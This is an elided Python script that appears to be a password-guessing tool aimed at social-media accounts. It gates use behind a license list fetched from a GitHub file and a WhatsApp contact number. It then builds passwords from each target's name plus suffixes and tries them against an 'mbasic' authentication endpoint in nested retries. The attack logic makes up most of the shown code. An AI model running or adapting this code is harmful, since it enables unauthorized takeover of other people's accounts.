...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/hamayunpro/file1/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923319258250')
        reg()
...
def a_s():
    ...
    def main(arg):
        ...
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://mbasic:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                ...
                pass2 = name.lower() + p2
                data = requests.get('http://mbasic:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    ...
                    pass3 = name.lower() + p3
                    data = requests.get('http://mbasic:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        ...
                        pass4 = name.lower() + p4
                        data = requests.get('http://mbasic:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
